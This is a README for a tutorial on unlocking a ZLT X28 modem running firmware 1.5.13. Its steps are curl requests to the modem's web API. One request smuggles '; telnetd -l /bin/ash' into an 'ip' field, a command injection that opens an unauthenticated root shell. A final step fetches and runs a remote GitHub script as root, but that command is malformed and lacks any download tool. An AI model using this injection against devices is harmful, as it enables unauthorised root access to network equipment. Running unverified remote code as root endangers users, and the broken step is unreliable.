<!-- README.md -->

# 🔓 ZLT X28 | Modem Unlock


### ✨ ZLT X28 Modem Unlock & Custom Admin Panel
![](img/zlt.jpg)

📘 **Persian README**  
👉 [مشاهده نسخه فارسی README](README.fa.md)



### 📊 Device Specifications

| Model | Software Version |
|------|------------------|
| ZLT X28 | 1.5.13 |

---

## 🚨 Serious Warning
**This method ONLY works on firmware version 1.5.13.  
Using it on other versions will break the web panel.**

---

## Overview
The ZLT X28 modem is based on a customized snapshot of **OpenWrt**.  
Unlocking it is straightforward but requires **temporary internet access** from another modem.

---

## Prerequisites

| Requirement | Linux / macOS | Windows |
|------------|---------------|---------|
| Second modem with internet | ✅ | ✅ |
| LAN cable | ✅ | ✅ |
| curl | Pre-installed | Built-in (Windows 10/11) |
| Telnet client | Usually installed | Must be enabled |

---

### ⚠️ Windows Important Note (READ THIS)
In **PowerShell**, `curl` is an alias for `Invoke-WebRequest`  
which **does NOT support `-k` or `--data-raw`**.

✅ **Always use `curl.exe` explicitly on Windows.**

---

## Step 1: Obtain `sessionId`

1. Open modem web panel
2. Open **Developer Tools**
   - Windows / Linux: `F12` or `Ctrl + Shift + I`
   - macOS: `Option + Command + I`
3. Go to **Network** tab
4. Reload the page
5. Click any request and copy `sessionId`

![](img/sessionId.png)

---

## Step 2: Enable WAN

Connect LAN cable from the internet-enabled modem to **Port 1** of ZLT X28.  
This is required to activate **DMZ**.

![](img/enable-wan.png)

---

### Enable WAN via Command

#### 🐧 Linux / macOS
```bash
curl -k http://192.168.70.1/cgi-bin/http.cgi \
 -X POST \
 --data-raw '{
  "method":"POST",
  "cmd":302,
  "LinkMode":"linkIP",
  "IpVersion":"IPV4",
  "IpMode":"dhcp",
  "MTU":1500,
  "NatEnable":"1",
  "wanRouter":"1",
  "language":"EN",
  "sessionId":"<YOUR_SESSION_ID>"
 }'
````

#### 🪟 Windows (CMD or PowerShell)

```powershell
curl.exe -k "http://192.168.70.1/cgi-bin/http.cgi" ^
 -X POST ^
 --data-raw "{\"method\":\"POST\",\"cmd\":302,\"LinkMode\":\"linkIP\",\"IpVersion\":\"IPV4\",\"IpMode\":\"dhcp\",\"MTU\":1500,\"NatEnable\":\"1\",\"wanRouter\":\"1\",\"language\":\"EN\",\"sessionId\":\"<YOUR_SESSION_ID>\"}"
```

---

## Step 3: Enable Telnet

#### 🐧 Linux / macOS

```bash
curl -k http://192.168.70.1/cgi-bin/http.cgi \
 --data-raw '{
  "enabled":"1",
  "ip":"192.168.1.1 ; telnetd -l /bin/ash",
  "cmd":172,
  "method":"POST",
  "subcmd":6,
  "language":"EN",
  "sessionId":"<YOUR_SESSION_ID>"
 }'
```

#### 🪟 Windows (CMD or PowerShell)

```powershell
curl.exe -k "http://192.168.70.1/cgi-bin/http.cgi" ^
 --data-raw "{\"enabled\":\"1\",\"ip\":\"192.168.1.1 ; telnetd -l /bin/ash\",\"cmd\":172,\"method\":\"POST\",\"subcmd\":6,\"language\":\"EN\",\"sessionId\":\"<YOUR_SESSION_ID>\"}"
```

---

## Step 4: Connect via Telnet

```bash
telnet 192.168.70.1
```

> Windows: Enable **Telnet Client** from
> Control Panel → Programs → Windows Features

---

## Step 5: Execute Unlock Script

Inside Telnet shell:

```sh
sh $(https://github.com/mahdigh782/Unlock-ZLT-X28/raw/refs/heads/main/x28)
```

The modem will reboot automatically.
After reboot, the modem is **fully unlocked**.

---

## Donations

Support development via **TRON (TRX)**:

💠 Wallet Address: TXDhVJDtkBUq2KN3QYZW4zDtkJkLLwFVgb


---

#ZLT_X28 #Modem_Unlock #Admin_Panel_Access #Custom_Modem_UI #Firmware_Upgrade #4G_Modem_Unlock #Network_Unlock_ZLT #ZLT_Admin_Unlock
